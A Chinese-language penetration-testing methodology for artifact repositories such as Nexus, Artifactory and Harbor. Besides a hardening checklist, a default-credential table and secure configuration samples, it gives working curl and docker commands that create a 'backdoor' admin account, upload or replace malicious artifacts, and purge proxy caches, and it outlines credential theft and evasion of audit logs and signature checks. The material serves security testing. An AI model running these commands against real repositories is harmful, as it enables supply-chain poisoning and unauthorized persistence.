# 制品仓库安全测试方法论

---

# 第一部分：文档概述

## 1.1 编写目的
- 为渗透测试人员提供制品仓库安全测试的系统化方法
- 指导测试人员识别私有制品仓库配置中的安全漏洞
- 帮助理解 Nexus、Artifactory、Harbor 等制品仓库的安全风险

## 1.2 适用范围
- 适用于使用 Nexus Repository、JFrog Artifactory、Harbor 等制品仓库
- 适用于 Maven、npm、Docker、PyPI 等多种制品类型
- 适用于企业私有制品仓库管理场景

## 1.3 读者对象
- 渗透测试工程师
- 制品仓库管理员
- DevSecOps 工程师
- 安全审计人员

---

# 第二部分：核心渗透技术专题

## 专题一：制品仓库安全测试

### 2.1 技术介绍

制品仓库安全测试是指对私有制品仓库服务器的配置、认证授权、网络隔离、制品签名等进行系统性安全评估，识别可能导致未授权访问、制品篡改、凭证泄露的安全弱点。

**制品仓库架构：**

```
┌─────────────────────────────────────────────────────────────┐
│                    制品仓库架构                              │
├─────────────────────────────────────────────────────────────┤
│  客户端                                                     │
│  ├── 开发者 (mvn/npm/docker push/pull)                     │
│  ├── CI/CD 系统 (自动发布和拉取)                            │
│  └── 生产环境 (部署时拉取)                                  │
├─────────────────────────────────────────────────────────────┤
│  制品仓库服务器                                             │
│  ├── Nexus Repository                                       │
│  ├── JFrog Artifactory                                      │
│  ├── Harbor (容器镜像)                                      │
│  └── 其他 (Verdaccio, PyPI Server 等)                       │
├─────────────────────────────────────────────────────────────┤
│  存储后端                                                   │
│  ├── 本地文件系统                                           │
│  ├── S3 兼容存储                                            │
│  └── 其他对象存储                                           │
└─────────────────────────────────────────────────────────────┘
```

**常见安全问题：**

| 问题类型 | 描述 | 危害等级 |
|---------|------|---------|
| 默认凭证 | 使用默认管理员密码 | 严重 |
| 未授权访问 | 仓库无需认证即可访问 | 严重 |
| 过度权限 | 用户权限过大 | 高 |
| 匿名访问 | 允许匿名用户上传 | 高 |
| HTTP 传输 | 未启用 HTTPS | 中 |
| 制品无签名 | 未验证制品完整性 | 中 |
| 代理配置不当 | 公共仓库代理污染 | 中 |

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 公共仓库代理 | 代理 npmjs.com、Maven Central | 代理缓存可能被投毒 |
| 内部发布 | 发布内部库和应用 | 未授权可能发布恶意制品 |
| Docker 镜像 | 推送和拉取容器镜像 | 镜像可能被篡改 |
| CI/CD 集成 | 自动发布和部署 | CI/CD 凭证可能泄露 |
| 多租户 | 多团队共享仓库 | 租户隔离可能不当 |
| 外部访问 | 供应商或合作伙伴访问 | 外部用户权限可能过大 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：识别制品仓库服务**
```bash
# Nexus Repository
curl -I http://target.com:8081
# X-Nexus-UI-Version: 3.xx.x

# JFrog Artifactory
curl -I http://target.com:8082/artifactory
# X-Artifactory-Id: xxx

# Harbor
curl -I https://harbor.target.com
# 检查 Harbor 版本信息

# 扫描常见端口
nmap -p 8081,8082,8083,5000 target.com
```

**步骤二：测试默认凭证**
```bash
# Nexus 默认凭证
curl -u admin:admin123 http://target.com:8081/service/local/status

# Artifactory 默认凭证
curl -u admin:password http://target.com:8082/artifactory/api/system/ping

# Harbor 默认凭证
curl -u admin:Harbor12345 https://harbor.target.com/api/users

# Gitea 默认凭证
curl -u admin:admin http://target.com:3000/api/v1/users
```

**步骤三：检查匿名访问**
```bash
# Nexus 匿名访问
curl http://target.com:8081/repository/maven-public/

# Artifactory 匿名访问
curl http://target.com:8082/artifactory/libs-release/

# Harbor 匿名访问
curl https://harbor.target.com/api/repositories
```

**步骤四：检查 API 端点**
```bash
# Nexus API
curl http://target.com:8081/service/rest/v1/repositories

# Artifactory API
curl http://target.com:8082/artifactory/api/repositories

# Harbor API
curl https://harbor.target.com/api/v2.0/projects
```

#### 2.3.2 白盒测试

**步骤一：审计仓库配置**
```bash
# Nexus 配置
cat $sonatype-work/nexus3/etc/nexus.properties
# 检查 admin.password
# 检查匿名访问配置

# Artifactory 配置
cat $ARTIFACTORY_HOME/etc/artifactory.config.yaml
# 检查安全配置
# 检查 LDAP/SSO 配置

# Harbor 配置
cat /etc/harbor/harbor.yml
# 检查 HTTPS 配置
# 检查认证配置
```

**步骤二：检查用户权限**
```bash
# Nexus 用户和角色
curl -u admin:admin123 \
  http://target.com:8081/service/rest/v1/security/users

curl -u admin:admin123 \
  http://target.com:8081/service/rest/v1/security/roles

# Artifactory 用户和组
curl -u admin:password \
  http://target.com:8082/artifactory/api/security/users

# Harbor 用户
curl -u admin:Harbor12345 \
  https://harbor.target.com/api/v2.0/users
```

**步骤三：检查仓库权限**
```bash
# 检查仓库访问控制
# 谁可以读取、写入、删除制品

# 检查匿名权限
# 是否允许匿名用户读取或写入

# 检查跨仓库权限
# 是否有不适当的跨仓库访问
```

### 2.4 漏洞利用方法

#### 2.4.1 默认凭证利用

```bash
# Nexus 利用
# 1. 使用默认凭证登录
curl -u admin:admin123 http://target.com:8081/service/local/status

# 2. 创建新用户
curl -X POST -u admin:admin123 \
  http://target.com:8081/service/rest/v1/security/users \
  -H "Content-Type: application/json" \
  -d '{"userId":"backdoor","password":"backdoor123","roles":["nx-admin"]}'

# 3. 上传恶意制品
curl -u backdoor:backdoor123 \
  --upload-file malicious.jar \
  http://target.com:8081/repository/maven-releases/com/example/app/1.0.1/app-1.0.1.jar
```

#### 2.4.2 未授权上传

```bash
# 如果允许匿名上传

# Maven
curl --upload-file malicious.pom \
  http://target.com:8081/repository/maven-releases/com/example/app/1.0.1/app-1.0.1.pom

# npm
curl -X PUT \
  -H "Content-Type: application/json" \
  -d @malicious-package.json \
  http://target.com:8081/repository/npm-internal/malicious-package

# Docker
docker login target.com:5000  # 如果允许匿名
docker tag malicious:latest target.com:5000/app:latest
docker push target.com:5000/app:latest
```

#### 2.4.3 制品篡改

```bash
# 1. 删除现有制品
curl -X DELETE -u admin:admin123 \
  http://target.com:8081/repository/maven-releases/com/example/app/1.0.0/app-1.0.0.jar

# 2. 上传恶意版本
curl -u admin:admin123 \
  --upload-file malicious.jar \
  http://target.com:8081/repository/maven-releases/com/example/app/1.0.0/app-1.0.0.jar

# 3. 清除缓存（如果是代理仓库）
curl -X POST -u admin:admin123 \
  http://target.com:8081/service/rest/v1/repositories/maven-proxy/cache
```

#### 2.4.4 凭证窃取

```bash
# Nexus 凭证存储
cat $sonatype-work/nexus3/etc/nexus.properties
# admin.password=xxx

# 数据库中的凭证
# Nexus 使用 OrientDB 或 H2
# 可以导出和破解哈希

# Artifactory 凭证
# 存储在数据库中
# 可以导出和破解
```

#### 2.4.5 代理仓库投毒

```bash
# 1. 识别代理的公共仓库
# Maven Central, npmjs.com, etc.

# 2. 如果公共仓库被投毒
# 代理缓存会缓存恶意制品

# 3. 或者利用缓存污染
# 上传与公共包同名的恶意制品
# 如果配置不当，可能优先使用本地制品
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过访问控制

```bash
# 1. 利用权限配置错误
# 如果权限配置有重叠或冲突

# 2. 利用角色继承
# 通过角色继承获取更高权限

# 3. 利用 API 漏洞
# 某些 API 可能绕过 UI 的权限检查
```

#### 2.5.2 绕过审计日志

```bash
# 1. 利用管理员权限
# 删除或修改审计日志

# 2. 利用 API
# 某些 API 操作可能不记录日志

# 3. 批量操作
# 一次性执行多个操作，增加审计难度
```

#### 2.5.3 绕过制品验证

```bash
# 1. 如果无签名验证
# 直接上传恶意制品

# 2. 如果签名验证可配置
# 修改配置关闭验证

# 3. 利用签名密钥泄露
# 使用窃取的密钥签名恶意制品
```

---

# 第三部分：附录

## 3.1 制品仓库安全检查表

| 检查项 | 推荐配置 | 风险等级 |
|-------|---------|---------|
| 默认凭证 | 修改默认密码 | 严重 |
| 匿名访问 | 禁用匿名访问 | 高 |
| HTTPS | 启用 HTTPS 传输 | 高 |
| RBAC | 实施基于角色的访问控制 | 高 |
| 制品签名 | 启用制品签名验证 | 中 |
| 审计日志 | 启用并定期审查 | 中 |
| 网络隔离 | 限制访问来源 | 中 |
| 定期更新 | 定期更新仓库软件 | 中 |

## 3.2 常见制品仓库默认凭证

| 仓库类型 | 默认 URL | 默认凭证 |
|---------|---------|---------|
| Nexus 3 | http://host:8081 | admin/admin123 |
| Artifactory | http://host:8082 | admin/password |
| Harbor | https://host | admin/Harbor12345 |
| Gitea | http://host:3000 | admin/admin |
| Verdaccio | http://host:4873 | 无默认，需注册 |

## 3.3 安全配置示例

```yaml
# Nexus 安全配置
# nexus.properties
nexus.scripts.allowCreation=false
nexus.security.anonymousAccess=false

# Harbor 安全配置
# harbor.yml
hostname: harbor.target.com
https:
  port: 443
  certificate: /etc/harbor/ssl/server.crt
  private_key: /etc/harbor/ssl/server.key

# Artifactory 安全配置
# artifactory.config.yaml
security:
  disableAnonymousAccess: true
  ldapSettings:
    enabled: true
```

## 3.4 安全工具

| 工具名称 | 用途 | 链接 |
|---------|------|------|
| trivy | 容器镜像扫描 | https://github.com/aquasecurity/trivy |
| clair | 容器镜像扫描 | https://github.com/quay/clair |
| grype | 制品漏洞扫描 | https://github.com/anchore/grype |
| cosign | 容器签名验证 | https://github.com/sigstore/cosign |

---

## 参考资源

- [Nexus Repository Security](https://help.sonatype.com/repomanager3/security)
- [JFrog Artifactory Security](https://www.jfrog.com/confluence/display/JFROG/Security)
- [Harbor Security](https://goharbor.io/docs/edge/administration/security/)
- [OWASP Supply Chain Security](https://owasp.org/www-project-supply-chain-security/)
